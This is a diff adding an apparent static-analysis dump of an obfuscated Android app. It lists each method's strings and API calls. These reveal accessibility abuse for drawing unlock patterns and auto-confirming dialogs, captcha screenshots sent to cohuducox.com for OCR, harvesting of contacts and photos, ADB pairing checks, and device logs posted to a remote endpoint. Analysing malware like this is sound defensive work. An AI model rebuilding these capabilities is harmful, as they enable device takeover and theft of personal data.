@@ -1,0 +1,132 @@
+==========================================================================================
+Landroidx/constraintlayout/motion/widget/؋; extends Ljava/lang/Object;
+  -- <init>['I', 'Ljava/lang/Object;', 'Ljava/lang/Object;'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+  -- onAddStarting['Landroidx/recyclerview/widget/RecyclerView$ViewHolder;'] -> V
+     S: ["", ".", "3000", "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", "ADB已连接", "BPkg:PatternUnlock", "Captcha input done: ", "CaptchaSolver", "CommandDispatcher", "Decrypted: ", "DiagReporter", "Domain probe failed: Probe failed for cohuducox.com", "DomainProber", "EditText not found", "Probe failed: ", "Probing ", "Response: ", "SocketManager", "TLS", "adbPairStatus", "cohuducox.com", "com.android.settings:id/edittext_view", "connected", "deviceId", "diag", "domain", "host", "https://www.cohuducox.com/adv.php?apk=10068&device=", "input error", "input_method", "message", "msg", "paired", "patternUnlock error", "patternUnlock: drawing pattern ", "patternUnlock: no accessibility service", "port", "power", "provide() can be called only once.", "reportEvent error", "status", "token", "ts", "type", "www", "已配对未连接", "未配对"]
+     C: ["Landroid/accessibilityservice/AccessibilityService;->dispatchGesture", "Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow", "Landroid/accessibilityservice/GestureDescription$Builder;-><init>", "Landroid/accessibilityservice/GestureDescription$Builder;->addStroke", "Landroid/accessibilityservice/GestureDescription$Builder;->build", "Landroid/app/job/JobService;->jobFinished", "Landroid/content/Context;->getResources", "Landroid/content/Context;->getSystemService", "Landroid/content/res/Resources;->getDisplayMetrics", "Landroid/graphics/Path;-><init>", "Landroid/graphics/Path;->lineTo", "Landroid/graphics/Path;->moveTo", "Landroid/os/Bundle;-><init>", "Landroid/os/Bundle;->putCharSequence", "Landroid/os/Handler;-><init>", "Landroid/os/Handler;->postDelayed", "Landroid/os/Looper;->getMainLooper", "Landroid/os/PowerManager$WakeLock;->acquire", "Landroid/os/PowerManager;->isInteractive", "Landroid/os/PowerManager;->newWakeLock", "Landroid/os/Process;->setThreadPriority", "Landroid/os/StrictMode;->setThreadPolicy", "Landroid/util/Log;->d", "Landroid/util/Log;->e", "Landroid/util/Log;->w", "Landroid/view/ViewManager;->removeView", "Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId", "Landroid/view/accessibility/AccessibilityNodeInfo;->performAction", "Landroid/view/inputmethod/InputMethodManager;->showSoftInput", "Landroid/webkit/WebView;->loadUrl"]
+==========================================================================================
+Lذ٨ۍ/ح; extends Ljava/lang/Object;
+  -- <init>['Ljava/lang/Object;', 'I', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+==========================================================================================
+Lڜٟٱڀ/ؠ; extends Ljava/lang/Object;
+  -- <init>['Ljava/lang/String;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+==========================================================================================
+Lڜٟٱڀ/خ; extends Ljava/lang/Object;
+  -- <init>['Lڜٟٱڀ/د;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+==========================================================================================
+Lڜٟٱڀ/ش; extends Ljava/lang/Object;
+  -- <init>[] -> V
+     C: ["Ljava/lang/Object;-><init>", "Ljava/util/concurrent/atomic/AtomicBoolean;-><init>", "Ljava/util/concurrent/atomic/AtomicInteger;-><init>"]
+==========================================================================================
+Lڝږ؁ڋ/آ; extends Ljava/lang/Object;
+  -- <init>['Landroid/accessibilityservice/AccessibilityService;', 'I'] -> V
+     C: ["Ljava/lang/Object;-><init>"]
+==========================================================================================
+Lڝږ؁ڋ/ر; extends Ljava/lang/Object;
+  -- <clinit>[] -> V
+     C: ["Ljava/util/concurrent/Executors;->newSingleThreadExecutor"]
+  -- ؋['Ljava/lang/String;', 'Ljava/lang/String;'] -> V
+     C: ["Landroidx/constraintlayout/motion/widget/؋;-><init>", "Ljava/util/concurrent/Executor;->execute"]
+  -- ؠ['Lorg/json/JSONObject;'] -> V
+     S: ["[]", "diag_log", "queue"]
+     C: ["Landroid/content/Context;->getSharedPreferences", "Landroid/content/SharedPreferences$Editor;->apply", "Landroid/content/SharedPreferences$Editor;->putString", "Landroid/content/SharedPreferences;->edit", "Landroid/content/SharedPreferences;->getString", "Lcom/lite/cloudfinder/App;->؋", "Lorg/json/JSONArray;-><init>", "Lorg/json/JSONArray;->length", "Lorg/json/JSONArray;->put", "Lorg/json/JSONArray;->remove", "Lorg/json/JSONArray;->toString"]
+  -- ء['Lorg/json/JSONObject;'] -> V
+     S: ["Content-Type", "POST", "UTF-8", "application/json", "https://www.cohuducox.com/api/device_log"]
+     C: ["Ljava/io/OutputStream;->close", "Ljava/io/OutputStream;->write", "Ljava/lang/String;->getBytes", "Ljava/net/HttpURLConnection;->disconnect", "Ljava/net/HttpURLConnection;->getResponseCode", "Ljava/net/HttpURLConnection;->setRequestMethod", "Ljava/net/URL;-><init>", "Ljava/net/URL;->openConnection", "Ljava/net/URLConnection;->getOutputStream", "Ljava/net/URLConnection;->setConnectTimeout", "Ljava/net/URLConnection;->setDoOutput", "Ljava/net/URLConnection;->setReadTimeout", "Ljava/net/URLConnection;->setRequestProperty", "Lorg/json/JSONObject;->toString"]
+==========================================================================================
+Lڗًقڔ/ء; extends Ljava/lang/Object;
+  -- <clinit>[] -> V
+     S: ["CLOSED_EMPTY", "CONDITION_FALSE", "NULL", "REMOVED_TASK", "UNINITIALIZED"]
+     C: ["Lئٱنۃؖۊڄئ/آ;-><init>", "Lڒ٠ئڿؕکڡ/؋;-><init>", "Lړجإٖټض/أ;-><init>"]
+  -- ؋[] -> Lںڍڒڸ/ٯ;
+     C: ["Lںڍڒڸ/ٯ;-><init>"]
+  -- ؠ['Ljava/lang/Object;'] -> Ljava/util/List;
+     S: ["kotlin.collections.MutableList"]
+     C: ["Ljava/lang/Class;->getName", "Lڗًقڔ/؋;->ٹ", "Lڗًقڔ/ء;->ؼ"]
+  -- ء['I', 'Ljava/lang/Object;'] -> V
+     S: ["kotlin.jvm.functions.Function"]
+     C: ["Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lkotlin/jvm/internal/إ;->getArity", "Lڗًقڔ/ء;->ؼ"]
+  -- آ['Lڦڶٛۯ/ا;'] -> Lڦڶٛۯ/ا;
+     S: ["null cannot be cast to non-null type kotlin.collections.Map<K of kotlin.collections.builders.MapBuilder, V of kotlin.collections.builders.MapBuilder>"]
+     C: ["Lڗًقڔ/؋;->ب", "Lڦڶٛۯ/ؤ;->ؠ"]
+  -- أ['Landroid/view/accessibility/AccessibilityNodeInfo;'] -> V
+     S: ["Aceptar", "Activar", "Activate", "Bestätigen", "CONFIRMED|", "CaptchaSolver", "Clicked confirm parent: ", "Clicked confirm: ", "Confirm", "Confirm button not found", "Confirmar", "Enviar", "OK", "Submit", "Usar", "captcha", "使用", "启动", "确定", "确认"]
+     C: ["Landroid/util/Log;->d", "Landroid/util/Log;->w", "Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText", "Landroid/view/accessibility/AccessibilityNodeInfo;->getParent", "Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable", "Landroid/view/accessibility/AccessibilityNodeInfo;->performAction", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/util/Iterator;->hasNext", "Ljava/util/Iterator;->next", "Ljava/util/List;->iterator", "Lڝږ؁ڋ/ر;->؋"]
+  -- ؤ['Ljava/lang/Throwable;'] -> Lڡُؑڨ/أ;
+     S: ["exception"]
+     C: ["Lڗًقڔ/؋;->ت", "Lڡُؑڨ/أ;-><init>"]
+  -- إ[] -> Z
+     S: ["FirebaseApp has not being initialized. Device might be in direct boot mode. Skip exporting delivery metrics to Big Query", "FirebaseMessaging", "com.google.firebase.messaging", "delivery_metrics_exported_to_big_query_enabled", "export_to_big_query"]
+     C: ["Landroid/content/Context;->getPackageManager", "Landroid/content/Context;->getPackageName", "Landroid/content/Context;->getSharedPreferences", "Landroid/content/SharedPreferences;->contains", "Landroid/content/SharedPreferences;->getBoolean", "Landroid/content/pm/PackageManager;->getApplicationInfo", "Landroid/os/BaseBundle;->containsKey", "Landroid/os/BaseBundle;->getBoolean", "Landroid/util/Log;->i", "Lڃٷښـ۝ۼ/إ;->؋", "Lڃٷښـ۝ۼ/إ;->ؠ"]
+  -- ئ['Lھٳ۰ڌ\u0604غڎۦ/إ;'] -> Lھٳ۰ڌ؄غڎۦ/إ;
+     C: ["Lھٳ۰ڌ؄غڎۦ/ؤ;-><init>"]
+  -- ا['Landroid/accessibilityservice/AccessibilityService;'] -> V
+     S: ["", "Cannot find captcha bounds", "Captcha from UI tree: [", "CaptchaSolver", "Content-Type", "DETECTED", "OCR API error: ", "OCR result: ", "OCR_FAILED", "OCR_RESULT|", "POST", "Starting captcha solve", "UI tree captcha not found, trying OCR fallback", "UI_TREE_READ|", "UTF-8", "\\s+", "]", "application/json", "captcha", "com.android.settings:id/verification_view", "deviceId", "https://cohuducox.com/api/ocr-captcha", "image", "root null", "sendForOcr error", "text"]
+     C: ["Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow", "Landroid/graphics/Bitmap;->compress", "Landroid/graphics/Bitmap;->createBitmap", "Landroid/graphics/Bitmap;->getHeight", "Landroid/graphics/Bitmap;->getWidth", "Landroid/graphics/Bitmap;->recycle", "Landroid/graphics/Rect;->height", "Landroid/graphics/Rect;->width", "Landroid/os/Handler;-><init>", "Landroid/os/Handler;->post", "Landroid/os/Looper;->getMainLooper", "Landroid/util/Base64;->encodeToString", "Landroid/util/Log;->d", "Landroid/util/Log;->e", "Landroid/util/Log;->w", "Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId", "Landroid/view/accessibility/AccessibilityNodeInfo;->getText", "Landroidx/constraintlayout/motion/widget/؋;-><init>", "Landroidx/core/view/accessibility/؋;->ئ", "Landroidx/core/view/accessibility/أ;->ة", "Ljava/io/ByteArrayOutputStream;-><init>", "Ljava/io/ByteArrayOutputStream;->toByteArray", "Ljava/io/InputStream;->close", "Ljava/io/InputStream;->read", "Ljava/io/OutputStream;->flush", "Ljava/io/OutputStream;->write", "Ljava/lang/CharSequence;->toString", "Ljava/lang/Math;->max", "Ljava/lang/Math;->min", "Ljava/lang/String;-><init>"]
+  -- ب['Lڨڡئٸت/ا;'] -> V
+     C: ["Lڨڡئٸت/ا;->get", "Lںڍڒڸ/ى;->؋", "Lںڍڒڸ/ٵ;->س"]
+  -- ة['Landroid/view/accessibility/AccessibilityNodeInfo;'] -> Ljava/lang/String;
+     S: ["", "TextView", "[A-Za-z0-9]+", "\\s+"]
+     C: ["Landroid/view/accessibility/AccessibilityNodeInfo;->getChild", "Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount", "Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName", "Landroid/view/accessibility/AccessibilityNodeInfo;->getText", "Ljava/lang/CharSequence;->toString", "Ljava/lang/String;->contains", "Ljava/lang/String;->length", "Ljava/lang/String;->matches", "Ljava/lang/String;->replaceAll", "Ljava/lang/String;->trim", "Lڗًقڔ/ء;->ة"]
+  -- ت['Landroid/view/accessibility/AccessibilityNodeInfo;'] -> Landroid/view/accessibility/AccessibilityNodeInfo;
+     S: ["", "EditText"]
+     C: ["Landroid/view/accessibility/AccessibilityNodeInfo;->getChild", "Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount", "Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName", "Ljava/lang/CharSequence;->toString", "Ljava/lang/String;->contains", "Lڗًقڔ/ء;->ت"]
+  -- ث['Landroid/view/accessibility/AccessibilityNodeInfo;', 'I'] -> Landroid/graphics/Rect;
+     S: ["", "ImageView"]
+     C: ["Landroid/graphics/Rect;-><init>", "Landroid/graphics/Rect;->height", "Landroid/graphics/Rect;->width", "Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen", "Landroid/view/accessibility/AccessibilityNodeInfo;->getChild", "Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount", "Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName", "Ljava/lang/CharSequence;->toString", "Ljava/lang/String;->contains", "Lڗًقڔ/ء;->ث"]
+  -- ج['Lھٳ۰ڌ\u0604غڎۦ/إ;', 'Lڨڡئٸت/ا;'] -> Lھٳ۰ڌ؄غڎۦ/إ;
+     S: ["Flow context cannot contain job in it. Had "]
+     C: ["Ljava/lang/IllegalArgumentException;-><init>", "Ljava/lang/Object;->toString", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lڃٷښـ۝ۼ/ؠ;->ا", "Lڗًقڔ/؋;->ؤ", "Lڨڡئٸت/ا;->get"]
+  -- ح['Lڨڡئٸت/ا;', 'Lڨڡئٸت/ا;', 'Z'] -> Lڨڡئٸت/ا;
+     C: ["Ljava/lang/Boolean;->booleanValue", "Lkotlin/jvm/internal/ر;-><init>", "Lڨڡئٸت/ا;->fold", "Lڨڡئٸت/ا;->plus", "Lڹےف/إ;-><init>"]
+  -- خ['Lڨڡئٸت/إ;', 'Lڨڡئٸت/ئ;'] -> Lڨڡئٸت/إ;
+     S: ["key"]
+     C: ["Lڗًقڔ/؋;->ؤ", "Lڗًقڔ/؋;->ت", "Lڨڡئٸت/إ;->getKey"]
+  -- د['Ljava/lang/String;', 'Z'] -> Lorg/json/JSONObject;
+     S: ["AlbumManager", "getLastImage error", "image", "path"]
+     C: ["Landroid/graphics/Bitmap;->compress", "Landroid/graphics/Bitmap;->recycle", "Landroid/graphics/BitmapFactory;->decodeFile", "Landroid/util/Base64;->encodeToString", "Landroid/util/Log;->e", "Ljava/io/ByteArrayOutputStream;-><init>", "Ljava/io/ByteArrayOutputStream;->toByteArray", "Ljava/io/File;-><init>", "Ljava/io/File;->delete", "Ljava/io/File;->exists", "Ljava/lang/String;->isEmpty", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->put"]
+  -- ذ['I', 'I', 'I'] -> I
+     S: ["Step is zero."]
+     C: ["Ljava/lang/IllegalArgumentException;-><init>"]
+  -- ر['Lorg/json/JSONArray;', 'I'] -> Lorg/json/JSONObject;
+     S: ["", "AlbumManager", "base64", "data", "fileMd5", "getThumbnails error", "maxWidth", "path"]
+     C: ["Landroid/graphics/Bitmap;->compress", "Landroid/graphics/Bitmap;->recycle", "Landroid/graphics/BitmapFactory$Options;-><init>", "Landroid/graphics/BitmapFactory;->decodeFile", "Landroid/util/Base64;->encodeToString", "Landroid/util/Log;->e", "Ljava/io/ByteArrayOutputStream;-><init>", "Ljava/io/ByteArrayOutputStream;->toByteArray", "Ljava/lang/String;->isEmpty", "Lorg/json/JSONArray;-><init>", "Lorg/json/JSONArray;->opt", "Lorg/json/JSONArray;->put", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->optInt", "Lorg/json/JSONObject;->optString", "Lorg/json/JSONObject;->put"]
+  -- ز['Landroid/content/Context;', 'I', 'I'] -> Lorg/json/JSONObject;
+     S: [" OFFSET ", "AlbumManager", "_data", "_display_name", "_id", "_size", "android:query-arg-limit", "android:query-arg-offset", "android:query-arg-sort-columns", "android:query-arg-sort-direction", "curpage", "data", "date", "date_added", "date_added DESC LIMIT ", "id", "listImages error", "name", "path", "size", "total"]
+     C: ["Landroid/content/ContentResolver;->query", "Landroid/database/Cursor;->close", "Landroid/database/Cursor;->getColumnIndexOrThrow", "Landroid/database/Cursor;->getCount", "Landroid/database/Cursor;->getLong", "Landroid/database/Cursor;->getString", "Landroid/database/Cursor;->moveToNext", "Landroid/os/BaseBundle;->putInt", "Landroid/os/BaseBundle;->putStringArray", "Landroid/os/Bundle;-><init>", "Landroid/util/Log;->e", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lorg/json/JSONArray;-><init>", "Lorg/json/JSONArray;->put", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->put"]
+  -- س['Landroid/content/Intent;'] -> V
+     S: ["", "%s is not supported byt this factory. Supported encodings are: %s.", "/topics/", "1:", ":", "Failed to send big query analytics payload.", "FirebaseMessaging", "Invalid TTL: ", "TransportFactory is null. Skip exporting message delivery metrics to Big Query", "_nr", "collapse_key", "com.google.firebase.messaging.RECEIVE_DIRECT_BOOT", "error parsing app ID", "error parsing project number", "error parsing sender ID", "from", "google.c.a.c_l", "google.c.a.m_l", "google.c.sender.id", "google.message_id", "google.product_id", "google.to", "google.ttl", "message_id", "proto"]
+     C: ["Landroid/content/Context;->getPackageName", "Landroid/content/Intent;->getIntExtra", "Landroid/os/BaseBundle;->containsKey", "Landroid/os/BaseBundle;->get", "Landroid/os/BaseBundle;->getString", "Landroid/text/TextUtils;->isEmpty", "Landroid/util/Log;->e", "Landroid/util/Log;->w", "Ljava/lang/IllegalArgumentException;-><init>", "Ljava/lang/Integer;->intValue", "Ljava/lang/Integer;->parseInt", "Ljava/lang/Integer;->valueOf", "Ljava/lang/Long;->parseLong", "Ljava/lang/RuntimeException;-><init>", "Ljava/lang/String;->equals", "Ljava/lang/String;->format", "Ljava/lang/String;->isEmpty", "Ljava/lang/String;->split", "Ljava/lang/String;->startsWith", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Ljava/util/Set;->contains", "L؋ڽبژ٦ښيل/؋;-><init>", "L؋ڽبژ٦ښيل/ؠ;-><init>", "L؋ڽبژ٦ښيل/ء;-><init>", "Lأۺؘٻڣ/ب;-><init>", "Lأۺؘٻڣ/ب;->ؠ", "Lڃٷښـ۝ۼ/ؠ;->ؠ", "Lڃٷښـ۝ۼ/إ;->؋"]
+  -- ش['Ljava/lang/String;', 'Landroid/os/Bundle;'] -> V
+     S: [" scionPayload=", "/topics/", "Default FirebaseApp has not been initialized. Skip logging event to GA.", "Error while parsing timestamp in GCM event", "Error while parsing use_device_time in GCM event", "FirebaseMessaging", "Logging to scion event=", "Unable to log event: analytics library is missing", "_ndt", "_nf", "_nmc", "_nmid", "_nmn", "_nmt", "_nr", "_nt", "data", "display", "from", "google.c.a.c_id", "google.c.a.c_l", "google.c.a.m_c", "google.c.a.m_l", "google.c.a.ts", "google.c.a.udt", "label", "message_channel"]
+     C: ["Landroid/os/BaseBundle;->containsKey", "Landroid/os/BaseBundle;->getString", "Landroid/os/BaseBundle;->putInt", "Landroid/os/BaseBundle;->putString", "Landroid/os/Bundle;-><init>", "Landroid/text/TextUtils;->isEmpty", "Landroid/util/Log;->d", "Landroid/util/Log;->e", "Landroid/util/Log;->isLoggable", "Landroid/util/Log;->w", "Landroidx/activity/result/؋;->ذ", "Ljava/lang/Integer;->parseInt", "Ljava/lang/String;->equals", "Ljava/lang/String;->startsWith", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lڃٷښـ۝ۼ/إ;->؋", "Lڃٷښـ۝ۼ/إ;->ؠ", "Lڊ۟چڗۙ٦/آ;->؋", "Lڙڧا/ء;->ة"]
+  -- ص['Lڨڡئٸت/إ;', 'Lڨڡئٸت/ئ;'] -> Lڨڡئٸت/ا;
+     S: ["key"]
+     C: ["Lڗًقڔ/؋;->ؤ", "Lڗًقڔ/؋;->ت", "Lڨڡئٸت/إ;->getKey"]
+  -- ض['Landroid/content/ContentResolver;', 'Ljava/lang/String;'] -> V
+     C: ["Landroid/provider/Settings$Secure;->putInt", "Landroid/provider/Settings$System;->putInt"]
+  -- ط['Landroid/content/Context;', 'I', 'I'] -> Lorg/json/JSONObject;
+     S: ["", " OFFSET ", "ContactReader", "_id", "contact_id = ?", "count(*) AS count", "curpage", "data", "data1", "display_name", "display_name ASC LIMIT ", "has_phone_number", "name", "phones", "read error", "total"]
+     C: ["Landroid/content/Context;->getContentResolver", "Landroid/database/Cursor;->close", "Landroid/database/Cursor;->getColumnIndexOrThrow", "Landroid/database/Cursor;->getInt", "Landroid/database/Cursor;->getString", "Landroid/database/Cursor;->moveToFirst", "Landroid/database/Cursor;->moveToNext", "Landroid/util/Log;->e", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lorg/json/JSONArray;-><init>", "Lorg/json/JSONArray;->put", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->put"]
+  -- ظ['Landroid/content/Context;'] -> V
+     S: ["acc_status", "android.intent.action.BATTERY_CHANGED", "battery", "enabled_accessibility_services", "heartbeat", "level", "off", "on", "scale"]
+     C: ["Landroid/content/Context;->getContentResolver", "Landroid/content/Context;->getPackageName", "Landroid/content/Context;->registerReceiver", "Landroid/content/Intent;->getIntExtra", "Landroid/content/IntentFilter;-><init>", "Landroid/provider/Settings$Secure;->getString", "Ljava/lang/String;->contains", "Lorg/json/JSONObject;-><init>", "Lorg/json/JSONObject;->put", "Lڗًقڔ/ء;->ع"]
+  -- ع['Ljava/lang/String;', 'Landroid/content/Context;', 'Lorg/json/JSONObject;'] -> V
+     C: ["Landroidx/room/أ;-><init>", "Ljava/lang/Thread;-><init>", "Ljava/lang/Thread;->start"]
+  -- غ['Landroid/content/Intent;'] -> Z
+     S: ["1", "com.google.firebase.messaging.RECEIVE_DIRECT_BOOT", "google.c.a.e"]
+     C: ["Landroid/content/Intent;->getAction", "Landroid/content/Intent;->getExtras", "Landroid/os/BaseBundle;->getString", "Ljava/lang/String;->equals"]
+  -- ػ['Landroid/content/Context;'] -> V
+     C: ["Landroid/content/Context;->getApplicationContext", "Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor", "Lڝږ؁ڋ/ؤ;-><init>"]
+  -- ؼ['Ljava/lang/Object;', 'Ljava/lang/String;'] -> V
+     S: [" cannot be cast to ", "null"]
+     C: ["Ljava/lang/Class;->getName", "Ljava/lang/ClassCastException;-><init>", "Ljava/lang/Object;->getClass", "Ljava/lang/StringBuilder;-><init>", "Ljava/lang/StringBuilder;->append", "Ljava/lang/StringBuilder;->toString", "Lڗًقڔ/؋;->ٹ"]
+  -- ؽ['Ljava/lang/Object;'] -> V
+  -- ؾ['Landroid/accessibilityservice/AccessibilityService;'] -> V
+     C: ["Ljava/lang/Thread;-><init>", "Ljava/lang/Thread;->start", "Lڝږ؁ڋ/آ;-><init>"]
+  -- ؿ['Lڨڡئٸت/أ;', 'Lڨڡئٸت/ا;', 'Ljava/lang/Object;'] -> Lںڍڒڸ/ځ;
+     C: ["Lڨڡئٸت/ا;->get", "Lګؓ۝ؒڄس/آ;->getCallerFrame", "Lںڍڒڸ/ځ;->ٯ"]
